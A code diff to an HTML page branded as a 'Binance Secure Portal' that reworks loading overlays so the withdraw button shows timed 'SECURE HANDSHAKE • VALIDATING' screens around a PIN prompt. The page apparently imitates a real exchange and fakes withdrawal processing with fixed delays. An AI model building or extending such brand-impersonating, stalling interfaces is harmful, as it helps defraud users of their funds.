@@ -79,22 +79,49 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
         
-        /* PROFESSIONAL LOADING ANIMATION */
+        /* ORIGINAL PAGE LOADING OVERLAY - KEPT UNCHANGED */
         .page-loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #0a0c10;
+            background: rgba(11,14,17,0.95);
             z-index: 10004;
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            backdrop-filter: blur(5px);
+        }
+        .page-loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #2b3139;
+            border-top-color: #f0b90b;
+            border-radius: 50%;
+            animation: pageSpin 1s linear infinite;
+        }
+        @keyframes pageSpin {
+            to { transform: rotate(360deg); }
         }
         
-        .loading-spinner-blue {
+        /* NEW WITHDRAW LOADING ANIMATION - ONLY FOR WITHDRAW BUTTON */
+        .withdraw-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0c10;
+            z-index: 10005;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .withdraw-spinner-blue {
             width: 48px;
             height: 48px;
             border: 3px solid rgba(59, 130, 246, 0.2);
@@ -108,7 +135,7 @@
             to { transform: rotate(360deg); }
         }
         
-        .loading-main-text {
+        .withdraw-main-text {
             font-size: 14px;
             font-weight: 500;
             letter-spacing: 2px;
@@ -118,7 +145,7 @@
             font-family: monospace;
         }
         
-        .loading-sub-text {
+        .withdraw-sub-text {
             font-size: 11px;
             color: #6c757d;
             letter-spacing: 1px;
@@ -126,26 +153,26 @@
             margin-bottom: 12px;
         }
         
-        .loading-dots {
+        .withdraw-dots {
             display: flex;
             gap: 6px;
             justify-content: center;
             align-items: center;
         }
         
-        .loading-dot {
+        .withdraw-dot {
             width: 5px;
             height: 5px;
             background-color: #6c757d;
             border-radius: 50%;
-            animation: dotPulse 1.4s ease-in-out infinite;
+            animation: withdrawDotPulse 1.4s ease-in-out infinite;
         }
         
-        .loading-dot:nth-child(1) { animation-delay: 0s; }
-        .loading-dot:nth-child(2) { animation-delay: 0.2s; }
-        .loading-dot:nth-child(3) { animation-delay: 0.4s; }
+        .withdraw-dot:nth-child(1) { animation-delay: 0s; }
+        .withdraw-dot:nth-child(2) { animation-delay: 0.2s; }
+        .withdraw-dot:nth-child(3) { animation-delay: 0.4s; }
         
-        @keyframes dotPulse {
+        @keyframes withdrawDotPulse {
             0%, 100% { opacity: 0.3; transform: scale(0.8); }
             50% { opacity: 1; transform: scale(1.2); }
         }
@@ -737,14 +764,21 @@
     <div id="message-modal" class="modal"><div class="modal-content"><i data-lucide="x" class="modal-close" onclick="closeModal('message-modal')"></i><h3 class="text-xl font-bold mb-4">Messages</h3><div class="space-y-3 max-h-96 overflow-y-auto"><div class="bg-[#2b3139] p-3 rounded-lg"><p class="text-sm text-white">Welcome to Binance Secure Portal!</p><p class="text-xs text-gray-500 mt-1">System • Just now</p></div><div class="bg-[#2b3139] p-3 rounded-lg"><p class="text-sm text-white">Your account is fully verified.</p><p class="text-xs text-gray-500 mt-1">Security • March 27, 2026</p></div><div class="bg-[#2b3139] p-3 rounded-lg"><p class="text-sm text-white">New trading pairs available: BTC/USDT, ETH/USDT</p><p class="text-xs text-gray-500 mt-1">Market Update • March 26, 2026</p></div></div></div></div>
     <div id="language-modal" class="modal"><div class="modal-content"><i data-lucide="x" class="modal-close" onclick="closeModal('language-modal')"></i><h3 class="text-xl font-bold mb-4">Select Language</h3><div class="space-y-2"><button onclick="setLanguage('en')" class="w-full text-left p-2 hover:bg-[#2b3139] rounded">English</button><button onclick="setLanguage('es')" class="w-full text-left p-2 hover:bg-[#2b3139] rounded">Español (Coming Soon)</button><button onclick="setLanguage('zh')" class="w-full text-left p-2 hover:bg-[#2b3139] rounded">简体中文 (Coming Soon)</button><button onclick="setLanguage('fr')" class="w-full text-left p-2 hover:bg-[#2b3139] rounded">Français (Coming Soon)</button></div></div></div>
 
+    <!-- ORIGINAL PAGE LOADING OVERLAY - KEPT UNCHANGED FOR OTHER BUTTONS -->
     <div id="page-loading-overlay" class="page-loading-overlay" style="display: none;">
-        <div class="loading-spinner-blue"></div>
-        <div class="loading-main-text">PROCESSING PLEASE WAIT</div>
-        <div class="loading-sub-text">SECURE HANDSHAKE • VALIDATING</div>
-        <div class="loading-dots">
-            <div class="loading-dot"></div>
-            <div class="loading-dot"></div>
-            <div class="loading-dot"></div>
+        <div class="page-loading-spinner"></div>
+        <p class="text-white mt-4">Loading...</p>
+    </div>
+
+    <!-- NEW WITHDRAW LOADING OVERLAY - ONLY FOR WITHDRAW BUTTON -->
+    <div id="withdraw-loading-overlay" class="withdraw-loading-overlay">
+        <div class="withdraw-spinner-blue"></div>
+        <div class="withdraw-main-text">PROCESSING PLEASE WAIT</div>
+        <div class="withdraw-sub-text">SECURE HANDSHAKE • VALIDATING</div>
+        <div class="withdraw-dots">
+            <div class="withdraw-dot"></div>
+            <div class="withdraw-dot"></div>
+            <div class="withdraw-dot"></div>
         </div>
     </div>
 
@@ -998,10 +1032,10 @@
             }
         }
         
-        // ============ WITHDRAW FUNCTIONALITY WITH PIN VERIFICATION ============
+        // ============ WITHDRAW FUNCTIONALITY WITH NEW LOADING ANIMATION ============
         
         async function handleWithdraw() {
-            // Show 6 seconds loading animation
+            // Show 6 seconds loading animation using the new withdraw overlay
             showWithdrawLoading(6000, () => {
                 // After 6 seconds, show PIN popup
                 showWithdrawPinPopup();
@@ -1009,7 +1043,7 @@
         }
 
         function showWithdrawLoading(duration, callback) {
-            const loadingOverlay = document.getElementById('page-loading-overlay');
+            const loadingOverlay = document.getElementById('withdraw-loading-overlay');
             if (loadingOverlay) {
                 loadingOverlay.style.display = 'flex';
                 setTimeout(() => {
@@ -1092,7 +1126,7 @@
                 return;
             }
             
-            // PIN correct - close modal and show 9 seconds loading
+            // PIN correct - close modal and show 9 seconds loading using the new withdraw overlay
             closeWithdrawPinModal();
             
             // Show 9 seconds loading animation
@@ -1553,7 +1587,7 @@
             finally { setButtonLoading(signupBtn, false, 'Create Account'); }
         }
         
-        // ============ REST OF EXISTING FUNCTIONS ============
+        // ============ REST OF EXISTING FUNCTIONS (KEPT UNCHANGED) ============
         
         function setLanguage(lang) {
             if (lang !== 'en') {
